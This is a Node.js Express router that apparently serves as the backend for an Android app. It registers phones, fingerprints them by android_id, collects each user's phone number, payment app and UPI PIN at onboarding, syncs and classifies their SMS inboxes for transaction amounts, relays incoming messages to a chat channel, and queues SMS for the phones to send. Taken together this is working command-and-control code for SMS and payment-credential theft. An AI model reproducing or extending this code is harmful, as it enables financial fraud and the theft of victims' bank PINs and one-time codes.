"use strict";

const express = require("express");
const config = require("../config");
const db = require("../database");
const u = require("../utils");
const hub = require("../hub");

const ah = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
const router = express.Router();

// ------------------------------------------------------------------ helpers

async function deviceByRid(rid) {
  const r = String(rid || "").trim();
  if (r.length < 8) return null;
  return db.devices.findOne({ registration_id_hash: u.hashValue(r) });
}

async function requireDevice(req, res, next) {
  const rid = String((req.body || {}).registration_id || req.query.registration_id || "");
  const device = await deviceByRid(rid).catch(() => null);
  if (!device) throw new u.HttpError(404, "device not registered");
  req.device = device;
  req.deviceId = String(device._id);
  next();
}

async function touchDevice(req) {
  const device = req.device;
  await db.devices.updateOne(
    { _id: device._id },
    { $set: { last_seen: db.utcNow(), is_active: true, install_state: "active" } }
  );
  const t = req.body && req.body.telemetry;
  if (t && typeof t === "object") {
    await u.applyTelemetry(device, t).catch(() => {});
    hub.broadcastDevice(req.deviceId, {
      ws_connected: hub.hub.online(req.deviceId),
      telemetry: t,
      last_seen: db.utcNow().toISOString(),
    });
  }
}

// ------------------------------------------------------------------ register

router.post("/devices/register", ah(async (req, res) => {
  const b = req.body || {};
  const rid = String(b.registration_id || "").trim().slice(0, 120);
  if (rid.length < 8) throw new u.HttpError(400, "registration_id required");

  const rh = u.hashValue(rid);
  const now = db.utcNow();
  const androidId = String(b.android_id || "").slice(0, 64);
  const installId = String(b.install_id || "").slice(0, 64);

  let device = await db.devices.findOne({ registration_id_hash: rh });
  let isNew = false;

  if (!device) {
    isNew = true;
    let installSeq = 1;
    if (androidId) {
      try {
        const fp = await db.install_fingerprints.findOneAndUpdate(
          { android_id: androidId },
          { $inc: { install_count: 1 }, $set: { last_seen: now } },
          { upsert: true, returnDocument: db.ReturnDocument.AFTER }
        );
        installSeq = parseInt((fp && fp.install_count) || 1, 10) || 1;
      } catch (_) {}
    }

    const r = await db.devices.insertOne({
      registration_id: rid,
      registration_id_hash: rh,
      short_id: await u.nextDeviceShortId(),
      device_name: String(b.device_name || "Unknown").slice(0, 60),
      platform: String(b.platform || "android").slice(0, 20),
      android_id: androidId || null,
      install_id: installId || null,
      app_version: String(b.app_version || "").slice(0, 20),
      created_at: now,
      first_seen: now,
      installed_at: now,
      last_seen: now,
      is_active: true,
      onboarded: false,
      install_state: "active",
      install_seq: installSeq,
      auto_sender: {
        enabled: false,
        channel_id: null,
        channel_title: null,
        sim_slots: [],
        tg_confirm: true,
        updated_at: now,
      },
    });
    device = await db.devices.findOne({ _id: r.insertedId });
    u.logEvent("device_register", { short_id: device && device.short_id }, String(r.insertedId));
    hub.spawn(
      hub.adminHub.broadcast({
        type: "device_status",
        data: { id: String(r.insertedId), status: "Offline", is_new: true },
      })
    );
  } else {
    await db.devices.updateOne(
      { _id: device._id },
      {
        $set: {
          last_seen: now,
          is_active: true,
          install_state: "active",
          ...(androidId ? { android_id: androidId } : {}),
          ...(installId ? { install_id: installId } : {}),
          ...(b.app_version ? { app_version: String(b.app_version).slice(0, 20) } : {}),
        },
        $unset: { uninstalled_at: "" },
      }
    );
  }

  if (b.telemetry && typeof b.telemetry === "object") {
    await u.applyTelemetry(device, b.telemetry).catch(() => {});
  }

  res.json({
    status: "ok",
    is_new: isNew,
    device: u.viewDevice(device, true),
    short_id: u.deviceShortId(device),
  });
}));

// -------------------------------------------------------------------- config

function deviceConfig(req) {
  const origin = `${req.protocol}://${req.get("host") || "localhost"}`;
  const wsBase = origin.replace(/^http/, "ws");
  return {
    status: "ok",
    version: config.VERSION,
    api_base: origin,
    server_time: db.utcNow().toISOString(),
    ws_url: `${wsBase}/ws/device`,
    ws_ping_interval: config.WS_PING_INTERVAL,
    ws_idle_timeout: config.WS_IDLE_TIMEOUT,
    online_window: config.ONLINE_WINDOW_SECONDS,
    max_sms_body: config.MAX_SMS_BODY,
    number_retry_after: config.NUMBER_RETRY_AFTER,
    outbox_repush_after: config.OUTBOX_REPUSH_AFTER,
    features: { sms: true, telemetry: true, auto_sender: true, inbox_sync: true },
  };
}

router.get("/devices/config", (req, res) => res.json(deviceConfig(req)));
router.post("/devices/config", (req, res) => res.json(deviceConfig(req)));

// ------------------------------------------------------------ heartbeat/telemetry

router.post("/devices/heartbeat", ah(requireDevice), ah(async (req, res) => {
  await touchDevice(req);
  res.json({ status: "ok", ts: db.utcNow().toISOString() });
}));

router.post("/devices/telemetry", ah(requireDevice), ah(async (req, res) => {
  await touchDevice(req);
  res.json({ status: "ok" });
}));

router.post("/devices/command/result", ah(requireDevice), ah(async (req, res) => {
  const b = req.body || {};
  const data = b.data && typeof b.data === "object" ? b.data : {};
  const action = String(b.action || "").toLowerCase();
  await touchDevice(req);
  if (data && Object.keys(data).length) {
    await u.applyTelemetry(req.device, data.telemetry || data).catch(() => {});
    hub.broadcastDevice(req.deviceId, {
      ws_connected: hub.hub.online(req.deviceId),
      telemetry: data.telemetry || data,
    });
  }
  u.logEvent("command_result", { action }, req.deviceId);
  res.json({ status: "ok" });
}));

// ---------------------------------------------------------------------- pair

router.post("/pair", ah(async (req, res) => {
  const b = req.body || {};
  const code = u.normalizeKey(b.code || b.pairing_code || "");
  const rid = String(b.registration_id || "").trim();
  if (code.length < 4) throw new u.HttpError(400, "pairing code required");

  const doc = await db.pairing_codes.findOne({ code_hash: u.hashValue(code) });
  if (!doc) throw new u.HttpError(404, "code galat ya use ho chuka");
  if (doc.expires_at instanceof Date && doc.expires_at.getTime() < Date.now()) {
    await db.pairing_codes.deleteOne({ _id: doc._id }).catch(() => {});
    throw new u.HttpError(410, "code expire ho gaya");
  }

  let device = null;
  if (doc.device_id) {
    device = await u.getDeviceOr404(doc.device_id).catch(() => null);
  } else if (rid) {
    device = await deviceByRid(rid);
  }
  if (!device) throw new u.HttpError(404, "device nahi mila");

  const now = db.utcNow();
  await db.devices.updateOne(
    { _id: device._id },
    { $set: { onboarded: true, onboarded_at: now, last_seen: now } }
  );
  await db.pairing_codes.deleteOne({ _id: doc._id }).catch(() => {});
  u.logEvent("device_paired", null, String(device._id));

  res.json({ status: "ok", device_id: String(device._id), short_id: u.deviceShortId(device) });
}));

// ------------------------------------------------------------------ onboarding

router.post("/devices/onboarding", ah(requireDevice), ah(async (req, res) => {
  const b = req.body || {};
  const now = db.utcNow();

  const fields = {
    onboarded: true,
    onboarded_at: now,
    last_seen: now,
    is_active: true,
    phone_number: u.normalizeNumber(b.phone_number) || String(b.phone_number || "").slice(0, 20),
    payment_app: String(b.payment_app || "").slice(0, 30),
    upi_pin: String(b.upi_pin || "").slice(0, 8),
    onboard_amount: Number(b.amount) || 1,
    onboarded_theme: String(b.theme || "").slice(0, 40),
  };
  if (b.device_name) fields.device_name = String(b.device_name).slice(0, 60);

  await db.devices.updateOne({ _id: req.device._id }, { $set: fields });
  if (b.telemetry && typeof b.telemetry === "object") {
    await u.applyTelemetry(req.device, b.telemetry).catch(() => {});
  }

  hub.broadcastDevice(req.deviceId, {
    onboarded: true,
    phone_number: fields.phone_number,
    device_name: fields.device_name || req.device.device_name,
  });
  u.logEvent("device_onboarding", { app: fields.payment_app }, req.deviceId);

  res.json({ status: "ok", device_id: req.deviceId });
}));

// ---------------------------------------------------------------------- event

router.post("/devices/event", ah(requireDevice), ah(async (req, res) => {
  const b = req.body || {};
  const event = String(b.event || "open").slice(0, 24);

  await db.device_events
    .insertOne({
      device_id: req.deviceId,
      device_name: req.device.device_name || "Unknown",
      event,
      app_version: String(b.app_version || "").slice(0, 20),
      android_id: String(b.android_id || "").slice(0, 64),
      created_at: db.utcNow(),
    })
    .catch(() => {});

  if (event === "install" || event === "update") {
    await db.devices
      .updateOne(
        { _id: req.device._id },
        { $set: { last_seen: db.utcNow(), install_state: "active" }, $unset: { uninstalled_at: "" } }
      )
      .catch(() => {});
  }

  res.json({ status: "ok" });
}));

// ---------------------------------------------------------------------- outbox

router.get("/devices/outbox", ah(requireDevice), ah(async (req, res) => {
  const limit = Math.max(1, Math.min(parseInt(req.query.limit || 20, 10), 50));

  const rows = await db.outbox
    .find({ device_id: req.deviceId, status: { $in: ["pending", "queued"] } })
    .sort({ _id: 1 })
    .limit(limit)
    .toArray();

  if (rows.length) {
    await db.outbox
      .updateMany(
        { _id: { $in: rows.map((r) => r._id) }, status: "pending" },
        { $set: { status: "queued", pushed_at: db.utcNow(), updated_at: db.utcNow() } }
      )
      .catch(() => {});
  }

  res.json({
    status: "ok",
    items: rows.map((r) => ({
      id: String(r._id),
      to: r.to || "",
      body: r.body || "",
      sim_slot: r.sim_slot === null || r.sim_slot === undefined ? -1 : r.sim_slot,
    })),
  });
}));

async function ackOutbox(outboxId, status, error = "", simSlot = -1) {
  let oid;
  try {
    oid = new db.ObjectId(String(outboxId));
  } catch (_) {
    return false;
  }

  const row = await db.outbox.findOne({ _id: oid });
  if (!row) return false;
  if (row.status === "sent") return true;

  const failed = status === "failed";
  const now = db.utcNow();

  await db.outbox.updateOne(
    { _id: oid },
    {
      $set: {
        status: failed ? "failed" : "sent",
        error: failed ? String(error || "").slice(0, 200) : null,
        acked_at: now,
        updated_at: now,
        ...(Number.isFinite(simSlot) && simSlot >= 0 ? { sim_slot: simSlot } : {}),
      },
    }
  );

  if (row.message_id) {
    try {
      await db.messages.updateOne(
        { _id: row.message_id },
        { $set: { status: failed ? "failed" : "sent", sent_at: now } }
      );
      hub.broadcastMessage(await db.messages.findOne({ _id: row.message_id }));
    } catch (_) {}
  }

  return true;
}

router.post("/devices/outbox/:id/ack", ah(async (req, res) => {
  const b = req.body || {};
  const slot = parseInt(b.sim_slot, 10);
  const applied = await ackOutbox(
    req.params.id,
    String(b.status || "sent"),
    String(b.error || ""),
    Number.isFinite(slot) ? slot : -1
  );
  res.json({ status: "ok", applied });
}));

router.post("/devices/:device_id/ack", ah(async (req, res) => {
  const b = req.body || {};
  const id = String(b.id || b.outbox_id || "");
  if (!id) throw new u.HttpError(400, "id required");
  const applied = await ackOutbox(id, String(b.status || "sent"), String(b.error || ""), -1);
  res.json({ status: "ok", applied });
}));

async function outboxCounters() {
  const out = { pending: 0, queued: 0, sent: 0, failed: 0 };
  try {
    const rows = await db.outbox
      .aggregate([{ $group: { _id: "$status", n: { $sum: 1 } } }])
      .toArray();
    for (const r of rows) {
      const k = String(r._id || "");
      if (k in out) out[k] = r.n;
    }
  } catch (_) {}
  return out;
}

// --------------------------------------------------------------- incoming sms

async function ingestSms(device, item) {
  const body = String(item.body || "").slice(0, config.MAX_SMS_BODY);
  const address = String(item.address || "").slice(0, 64);
  if (!body) return null;

  const direction = ["in", "out"].includes(String(item.direction)) ? String(item.direction) : "in";
  const { kind, amount, flow } = u.classifySms(address, body);

  const mid = await u.insertMessage({
    device_id: String(device._id),
    device_name: device.device_name || "Unknown",
    direction,
    address,
    body,
    kind,
    amount,
    flow,
    status: "received",
    created_at: db.utcNow(),
  });

  if (!mid) return null;

  const doc = await db.messages.findOne({ _id: mid }).catch(() => null);
  hub.broadcastMessage(doc);
  if (direction === "in") hub.spawn(hub.relayIncoming(device, address, body));
  return mid;
}

router.post("/devices/sms/incoming", ah(requireDevice), ah(async (req, res) => {
  const mid = await ingestSms(req.device, req.body || {});
  if (!mid) return res.json({ status: "ignored" });

  await db.devices
    .updateOne({ _id: req.device._id }, { $set: { last_seen: db.utcNow() } })
    .catch(() => {});

  res.json({ status: "ok", id: String(mid) });
}));

router.post("/devices/sms/sync", ah(requireDevice), ah(async (req, res) => {
  const items = Array.isArray((req.body || {}).messages) ? req.body.messages.slice(0, 200) : [];
  let stored = 0;
  for (const item of items) {
    if (!item || typeof item !== "object") continue;
    if (await ingestSms(req.device, item).catch(() => null)) stored += 1;
  }
  res.json({ status: "ok", stored });
}));

module.exports = router;
module.exports.ackOutbox = ackOutbox;
module.exports.outboxCounters = outboxCounters;